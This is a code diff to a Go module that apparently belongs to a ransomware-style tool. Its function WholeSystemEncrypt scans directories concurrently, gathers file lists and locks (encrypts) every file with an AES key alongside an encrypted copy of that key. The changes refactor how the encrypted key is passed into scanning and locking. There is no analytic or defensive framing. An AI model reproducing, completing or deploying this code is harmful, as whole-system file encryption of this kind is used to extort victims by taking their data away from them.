@@ -3,11 +3,10 @@ package system
 import (
 	"fmt"
 	"os"
-	"runtime"
 	"sync"
 	"time"
 
-	file "frostbite.com/tools/file"
+	"frostbite.com/tools/file"
 	scan "frostbite.com/tools/scan"
 	humanize "github.com/dustin/go-humanize"
 	"github.com/shirou/gopsutil/disk"
@@ -33,12 +32,11 @@ func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {
 	dirsToScan = []string{"/run/media/dejan/AMD/vm/"}
 	pl("dirsToScan: ", dirsToScan)
 
-	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
 	//listen for channel and append to filesToEncrypt
-	filesToEncrypt = getAllFiles(dirsToScan, filesToEncrypt)
+	filesToEncrypt = getAllFiles(dirsToScan, encryptedAesKey)
 	//encrypt files
 	pl("Locking...")
-	file.LockFilesArray(filesToEncrypt, aesKey, encryptedAesKey)
+	file.LockFilesArray(filesToEncrypt, aesKey)
 
 	timeEnd := time.Now()
 	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
@@ -47,14 +45,15 @@ func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {
 
 }
 
-func getAllFiles(dirsToScan []string, filesToEncrypt []string) []string {
+func getAllFiles(dirsToScan []string, encryptedAesKey []byte) []string {
 	wg := sync.WaitGroup{}
 	wg.Add(len(dirsToScan))
 
 	var chanFilesScanned = make(chan []string)
+	var filesToEncrypt []string
 
 	for _, dir := range dirsToScan {
-		go goroutineScanDir(dir, &wg, chanFilesScanned)
+		go goroutineScanDir(dir, &wg, chanFilesScanned, encryptedAesKey)
 	}
 
 	go func() {
@@ -70,7 +69,7 @@ func getAllFiles(dirsToScan []string, filesToEncrypt []string) []string {
 	return filesToEncrypt
 }
 
-func goroutineScanDir(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string) {
+func goroutineScanDir(dir string, wg *sync.WaitGroup, chanFilesScanned chan []string, encryptedAesKey []byte) {
 
 	_, err := os.Stat(dir)
 	if err != nil {
@@ -80,11 +79,11 @@ func goroutineScanDir(dir string, wg *sync.WaitGroup, chanFilesScanned chan []st
 		}
 	} else {
 		pl("Scanning: ", dir)
-		files, size := scan.ScanNoSideEffects(dir, true)
+		files := scan.ScanFilesInDirWithLockAdd(dir, true, encryptedAesKey)
 		//send files to channel
 		chanFilesScanned <- files
 
-		pl("Size of found files in: ", dir, " is ", humanize.Bytes(uint64(size)))
+		pl("Files found in this dir: ", humanize.Comma(int64(len(files))))
 	}
 }
 
